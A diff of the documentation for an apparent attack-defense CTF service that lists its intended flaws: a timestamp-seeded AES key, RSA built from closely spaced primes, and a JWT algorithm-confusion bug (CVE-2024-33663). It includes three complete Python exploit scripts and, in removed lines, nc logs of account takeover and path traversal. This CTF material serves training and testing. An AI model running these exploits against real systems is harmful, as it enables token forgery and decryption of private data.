@@ -2,165 +2,375 @@ Service documentation
 ======================
 This is the place to keep important documentation details about your service.
 
+
+# Flagstores
+
+There are 3 Flagstores.
+First inside the Groupchat messages.
+Second inside the private messages. 
+Third is inside the Status accessible via Profile or via Backup.
+
 # Vulnerabilities
 
-Please keep track of your intended vulnerabilities here:
+The service contains 3 vulnerabilities, exploits that are based on the enowars infrastructure are listed down below.
+The exploits are also listed inside the checker/src/checker.py
 
-## Debug enabled
+## AES WEAK SEED GENERATOR
 
 - Category: Misconfiguration
 - Difficulty: Easy
+- Position: Inside the Groupchats
 
-When `self.debug` is set to `True`, the `dump` command will list all users and their notes. 
+The seed is just the timestamp therefore you can either bruteforce it or receive the timestamp of each note in Groupchats
 
-## Account Takeover
+## RSA WITH SEXY PRIMES
+
+- Category: Crypto
+- Difficulty: Medium-easy
+- Position: Inside the Home/Private Messages
+
+The base RSA function uses 2 prime numbers that are connected, called sexy primes because they are p = q + 6. This makes it possible to create the private key from the public key.
+
+## AUTHLIB AUTHENTICATION 
 
 - Category: Authentication
-- Difficulty: Medium
+- Difficulty: Medium-hard
+- Position: Backup
 
-When registering a new user, the service does not check if the user already exists and simply overwrites the password (`self.users[reg_user] = reg_pw`). The list of existing users can be obtained with the `user` command.
-
-## Arbitrary Read or Write (Account Takeover v2)
-
-- Category: Path traversal
-- Difficulty: Medium
-
-The `FilesystemDict` uses user-supplied input when constructing the file paths. This could be used to write JSON-encoded data to any files. 
-
-The impact has to be further analyzed. It at least leads to another account takeover (overwrite the password for other users, i.e. using `reg ../users/foo bar`).
-
-*Note:* Without a proper impact analysis, we would classify this issue as a `unintended` vulnerability. Please try to keep such issues to a minimum and document them nonetheless.
+CVE-2024-33663
+The Backup token is vulnerable as the authlib does not differaniate between 2 algorithms. This makes it possible to not only authenticate/sign with the private key inside the token, but also create a token with the public key that will be handled the same way as the private key token. You can create a fake token via the userlist in which the public keys are listed than you can login in as if you would have the actual private key token.
 
 # Exploits
 
-For each vulnerability, you should have a working example exploit ready! 
+None of the Exploits are connected.
 
-## Debug enabled:
 
-Connect to the service and run `dump`:
+## Exploit 1
+```bash
+#!/usr/bin/env python3
 
-```
-gehaxelt@LagTop ~> nc 192.168.2.112 2323
-Welcome to the 1337 n0t3b00k!
-> dump
-Users:
-test:test
-foo:bar
-     Note 0:acbd18db4cc2f85cedef654fccc4a4d8:foo
-     Note 1:37b51d194a7513e45b56f6524f2d51f2:bar
-     Note 2:acbd18db4cc2f85cedef654fccc4a4d8:foo
-4FOBMO10HWLC:EDPWN79U2KNL
-I4K3P0SK3PST:CK5FALD39Y0S
-B70YKMW72KUR:79Y5IM7FD7O8
-GB7QC0DKYXPS:89TY8HI6OCBA
-NXPTITQUSN2M:WYIWSGRZNKTX
-6699DPYPAQDL:7IFEPP3P3LBI
-     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
-MPG81XWFHNE8:H8KP8VECBQOR
-     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
-QN973IXF53HT:9BUVY6JNMGIW
-     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
-UI2WTY7E7KC5:87SB830QHVX3
-     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
-XXPLIXZ9ZN1Q:F88L3J4GA2LE
-     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
-N43LU1348D19:YWT9TFCSVA2T
-     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
-3DP6COPE6GMX:OI9437MJORZR
-     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
-I8ZUNTWZ0Y0Q:B3AI1LN9SAAE
-     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
-JUACZ5J3D475:5RNZ1ETOFBS6
-     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
-KGFZNGHROLUS:05826L6X39XM
-     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
-FV9VM13K8MGF:POUIW5CM6PY2
-     Note 0:73c94f6925fea8202b5b96dbc018ad00:ENOTESTFLAG
-XAHOKR4QD63O:VENSD82XO1XM
-     Note 0:199480a3640248d5ea679b596d91c350:SKLNAYZAG7QX65RTMW3DCZAKPS9OC0TFH6GH
-```
+import base64
+import json
+import random
+import string
+import sys
+import threading
+import time
+import traceback
+from typing import Optional
 
-The flags are in the output.
+import requests
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+from Crypto.Util.Padding import pad, unpad
 
-## Account Takeover
 
-Connect to the service and use the `user` command to obtain a list of users:
+def random_number():
+    random_number = random.randint(0, 2**128 - 1)
+    return random_number.to_bytes(16, byteorder='big')
 
-```
-gehaxelt@LagTop ~ [130]> nc 192.168.2.112 2323
-Welcome to the 1337 n0t3b00k!
-> user
-User 0: test
-User 1: foo
-User 2: 4FOBMO10HWLC
-User 3: I4K3P0SK3PST
-User 4: B70YKMW72KUR
-User 5: GB7QC0DKYXPS
-User 6: NXPTITQUSN2M
-User 7: 6699DPYPAQDL
-User 8: MPG81XWFHNE8
-User 9: QN973IXF53HT
-User 10: UI2WTY7E7KC5
-User 11: XXPLIXZ9ZN1Q
-User 12: N43LU1348D19
-User 13: 3DP6COPE6GMX
-User 14: I8ZUNTWZ0Y0Q
-User 15: JUACZ5J3D475
-User 16: KGFZNGHROLUS
-User 17: FV9VM13K8MGF
-User 18: XAHOKR4QD63O
-```
 
-Use the username(s) and the `reg` command to set a different password. Next, `log`in as the user, `list` their notes and obtain the flag:
+def aes_decrypt_specified_time(ciphertext_base64, time_str):
+    # get current time from time_str
+    time = time_str.split(':')
+    seed = time[0] + time[1]
+    random.seed(seed)
 
-```
-> reg XAHOKR4QD63O foo
-User successfully registered
-> log XAHOKR4QD63O foo
-Successfully logged in!
-> list 
-Note 0: 199480a3640248d5ea679b596d91c350
-> get 199480a3640248d5ea679b596d91c350
-SKLNAYZAG7QX65RTMW3DCZAKPS9OC0TFH6GH
-```
+    key = random_number()
+    nonce = random_number()
 
-## Arbitrary Read or Write (Account Takeover v2)
+    ciphertext = base64.b64decode(ciphertext_base64)
 
-Connect to the service and list all users:
+    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+    padded_plaintext = cipher.decrypt(ciphertext)
+    plaintext_bytes = unpad(padded_plaintext, AES.block_size)
+    return plaintext_bytes.decode()
 
-```
-gehaxelt@LagTop ~/C/A/e/service-example (cleanup)> nc 192.168.2.112 2323
-Welcome to the 1337 n0t3b00k!
-> users
-User 0: 0WTC89S0Y67Y
-User 1: HWG5RBYEQX3Y
-User 2: XK2UJAC7KWMB
-User 3: CF8TFV304DMO
-User 4: E9XAV2ACHRY0
-User 5: SHBSC21EC963
-User 6: AC1MSHQS7HE8
-User 7: OVTN3ZXRO7X0
-User 8: IM03X7OWDEV7
-User 9: NQST4C3ABWLD
-User 10: VS7ZY06LELHI
-User 11: WFS6JGH8DDYO
-User 12: WBAYX5MLDMIG
-User 13: H4YXGNP9D3GS
-User 14: S735UCC1O7FE
-User 15: foo
+TARGET = 'localhost'
+TARGET1 = sys.argv[1] # The target's ip address is passed as an command line argument
+
+def exploit(hint: Optional[str], flag_store: Optional[int]):
+    print(f'Attacking {TARGET} (flag_store={flag_store}, hint={hint})')
+    session = requests.Session()
+    # TODO implement exploit
+
+    # Get the cookie by signing up as a user
+    # Define the registration endpoint and the data for the new user
+    url = f"http://{TARGET}:9696/sign-up"  # Updated URL to match your Flask app's running port
+    data = {
+        "email": ''.join(random.choices(string.ascii_lowercase, k=10)) + "@example.com",
+        "name": "New User",
+        "password1": "securepassword",
+        "password2": "securepassword",
+        "public_key": "off"
+    }
+
+    # Perform the registration request
+    response = session.post(url, data=data)
+    cookies = {}
+
+    # Check if registration was successful by looking for a success message in the response
+    if "Account created!" in response.text:
+        # Retrieve the session cookie
+        cookies = session.cookies.get_dict()
+        print("Registration successful!")
+        print("Session cookies:", cookies)
+    else:
+        print("Registration failed!")
+        print(response.text)
+
+    r = session.get(f'http://{TARGET}:9696/creategroup/{hint}', cookies=cookies)
+
+    # Get the contents of the <li class="list-group-item"> element
+    content = r.text.split('<li class="list-group-item">')[1].split('</li>')[0]
+    encrypted = content.split("\n")[1].strip()
+    timestamp = content.split("\n")[2].strip().split(" ")[1]
+    decrypted_flag = aes_decrypt_specified_time(encrypted, timestamp)
+
+    # print decrypted flag
+    print(decrypted_flag)
+
+
+# Some CTFs publish information ('flag hints') which help you getting individual flags (e.g. the usernames of users that deposited flags).
+# Bambi CTF / ENOWARS flag hints:
+attack_info = requests.get('http://10.0.13.37:5001/scoreboard/attack.json').json()
+service_info = attack_info['services']['Whatsscam'] # Get the information for the current target
+threads = []
+team_info = service_info[TARGET1]
+for round_nr in team_info:
+    round_info = team_info[round_nr]
+    # Groups are in flagstore 1
+    flag_store = '1'
+    store_info = round_info[flag_store]
+    for flag_info in store_info:
+        # flag_info will always be a string, which you might have to parse with json.loads
+        t = threading.Thread(target=exploit, args=(flag_info, flag_store))
+        t.start()
+        threads.append(t)
+for thread in threads:
+    try:
+        thread.join()
+    except Exception as e:
+        print(e)
 ```
 
-Use the username(s) and the `reg` command to set a new password by abusing the path traversal bug:
+## Exploit 2
+```bash
+#!/usr/bin/env python3
 
+import base64
+import json
+import random
+import string
+import sys
+import threading
+import time
+import traceback
+from typing import Optional
+from bs4 import BeautifulSoup
+
+import requests
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+from Crypto.Util.Padding import pad, unpad
+from Crypto.PublicKey import RSA
+from Crypto.Hash import HMAC, SHA256
+
+
+def format_rsa_public_key(key_str):
+    #byte_len = 32 #64
+    byte_len = 64
+    key_str = key_str.replace(" ", "").replace("\n", "")
+    formatted_key = "-----BEGIN RSA PUBLIC KEY-----\n"
+    
+    # Split the key into 64-character lines
+    for i in range(0, len(key_str), byte_len):
+        formatted_key += key_str[i:i+byte_len] + "\n"
+    
+    formatted_key += "-----END RSA PUBLIC KEY-----\n"
+    return formatted_key
+
+
+def random_number():
+    random_number = random.randint(0, 2**128 - 1)
+    return random_number.to_bytes(16, byteorder='big')
+
+
+def aes_decrypt_specified_time(ciphertext_base64, time_str):
+    # get current time from time_str
+    time = time_str.split(':')
+    seed = time[0] + time[1]
+    random.seed(seed)
+
+    key = random_number()
+    nonce = random_number()
+
+    ciphertext = base64.b64decode(ciphertext_base64)
+
+    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+    padded_plaintext = cipher.decrypt(ciphertext)
+    plaintext_bytes = unpad(padded_plaintext, AES.block_size)
+    return plaintext_bytes.decode()
+
+TARGET = 'localhost'
+TARGET1 = sys.argv[1] # The target's ip address is passed as an command line argument
+
+def exploit(hint: Optional[str], flag_store: Optional[int]):
+    print(f'Attacking {TARGET} (flag_store={flag_store}, hint={hint})')
+    session = requests.Session()
+    # TODO implement exploit
+
+    # Get the cookie by signing up as a user
+    # Define the registration endpoint and the data for the new user
+    url = f"http://{TARGET}:9696/sign-up"  # Updated URL to match your Flask app's running port
+    data = {
+        "email": ''.join(random.choices(string.ascii_lowercase, k=10)) + "@example.com",
+        "name": "New User",
+        "password1": "securepassword",
+        "password2": "securepassword",
+        "public_key": "off"
+    }
+
+    # Perform the registration request
+    response = session.post(url, data=data)
+    cookies = {}
+
+    # Check if registration was successful by looking for a success message in the response
+    # if "Account created!" in response.text:
+    #     # Retrieve the session cookie
+    #     cookies = session.cookies.get_dict()
+    #     print("Registration successful!")
+    #     print("Session cookies:", cookies)
+    # else:
+    #     print("Registration failed!")
+    #     print(response.text)
+
+    r = session.get(f'http://{TARGET}:9696/userlist', cookies=cookies)
+
+    email = str(hint)
+    soup = BeautifulSoup(r.text, "html.parser")
+    li = soup.find_all("li")
+    li = [x.text for x in li]
+    li = [x.split(" ") for x in li]
+    li = filter(lambda x: email + '\n' in x, li)
+    li = filter(lambda x: x != '' and x != '\n' and x != email + '\n', list(li)[0])
+    public_key = list(li)
+    public_key = public_key[2]
+    #print("das ist public:", public_key)
+    
+    public_key = format_rsa_public_key(public_key)
+    public_key = public_key + "\n"
+    PUBKEY = RSA.import_key(public_key)
+    PUBKEY = PUBKEY.public_key().export_key(format='PEM')
+
+
+    b64 = lambda x:base64.urlsafe_b64encode(x).replace(b'=',b'')
+    payload = b64(b'{"alg":"HS256"}') + b'.' + b64(f'{{"email":"{email}"}}'.encode('utf-8'))
+    hasher = HMAC.new(PUBKEY, digestmod=SHA256)
+    hasher.update(payload)
+    evil_token = payload + b'.' + b64(hasher.digest())
+    evil_token = evil_token.decode()
+    
+    print('das ist token', evil_token)
+    
+    url = f"http://{TARGET}:9696/backup"  # Updated URL to match your Flask app's running port
+    data = {
+        "email_backup": str(hint),
+        'token_backup': str(evil_token)
+    }
+
+    # Perform the registration request
+    response = session.post(url, data=data)
+    
+    print(response.text)
+    
+
+
+# Some CTFs publish information ('flag hints') which help you getting individual flags (e.g. the usernames of users that deposited flags).
+# Bambi CTF / ENOWARS flag hints:
+attack_info = requests.get('http://10.0.13.37:5001/scoreboard/attack.json').json()
+service_info = attack_info['services']['Whatsscam'] # Get the information for the current target
+threads = []
+team_info = service_info[TARGET1]
+for round_nr in team_info:
+    round_info = team_info[round_nr]
+    # Groups are in flagstore 2
+    flag_store = '2'
+    store_info = round_info[flag_store]
+    for flag_info in store_info:
+        # flag_info will always be a string, which you might have to parse with json.loads
+        t = threading.Thread(target=exploit, args=(flag_info, flag_store))
+        t.start()
+        threads.append(t)
+for thread in threads:
+    try:
+        thread.join()
+    except Exception as e:
+        print(e)
 ```
-gehaxelt@LagTop ~/C/A/e/service-example (cleanup)> nc 192.168.2.112 2323
-Welcome to the 1337 n0t3b00k!
-> reg ../users/foo bar
-User successfully registered
-> log foo bar
-Successfully logged in!
-> list
-Note 0: 581f1b0f439b22d1d2c617d1e8963505
-> get 581f1b0f439b22d1d2c617d1e8963505
-ENOTESTFLAG
+
+## Exploit 3
+```bash
+#!/usr/bin/env python3
+
+import json
+import requests
+import sys
+import threading
+import traceback
+import string
+import random
+import time
+from typing import Optional
+import re
+import gmpy2
+from Crypto.Util.number import bytes_to_long, long_to_bytes, inverse
+from Crypto.PublicKey import RSA
+import base64
+
+#TARGET = sys.argv[1] # The target's ip address is passed as an command line argument
+TARGET = 'localhost'
+def fermat(n : int, iterations = 1) -> int:
+  '''Fermat factorisation, tries given number of iterations
+  Return prime factor or 'None' '''
+  m, perfect_square = gmpy2.iroot(n, 2)
+  if perfect_square:
+    return m
+  else:
+    m += 1
+  for i in range(iterations):
+    delta, perfect_square = gmpy2.iroot((m+i)**2 - n, 2)
+    if perfect_square:
+      return int(m + i - delta)
+
+
+#print(f'Attacking {TARGET} (flag_store={flag_store}, hint={hint})')
+session = requests.Session()
+password = ''.join(random.choices(string.ascii_letters, k = 10))
+user = ''.join(random.choices(string.ascii_letters, k = 10))
+# TODO implement exploit
+ans = session.post('http://localhost:9696/sign-up', data = {'password1':  password, 'password2':password, 'name':user, 'email':user+'@bar.de'})
+ans = session.post('http://localhost:9696/login', data = {'password':  password, 'email':user+'@bar.de'})
+home = ans.text
+messages = {user: msg for user,msg in re.findall(r'To: (.*)</br>\n            \n            (.*)', home)}
+ans = session.get('http://localhost:9696/userlist')
+data = re.findall(r'Email: (.*)<br>\n          PublicKey: (.*)', ans.text)
+pubkeys = {u: RSA.import_key('-----BEGIN PUBLIC KEY-----\n'+n+'\n-----END PUBLIC KEY-----').n for u,n in data}
+for user in messages:
+    n = pubkeys[user]
+    p = fermat(n)
+    if p is None: 
+        #print(f'{user} failed')
+        continue
+    q = n // p
+    phi = (p-1)*(q-1)
+    d = inverse(65537,phi)
+    flag = long_to_bytes(pow(bytes_to_long(base64.b64decode(messages[user])), d, n))[-51:].decode()
+    print(flag)
 ```
+
+# Fixes
+
+Easy fixes are blocked via the checker which checks for missing flags and missing content inside the service.
+The Fixes are listed inside the documentation/fix.py . You will have to switch the lines of code to fix the service.
+The Fixes listed are only part of all possible ways to fix the exploits.
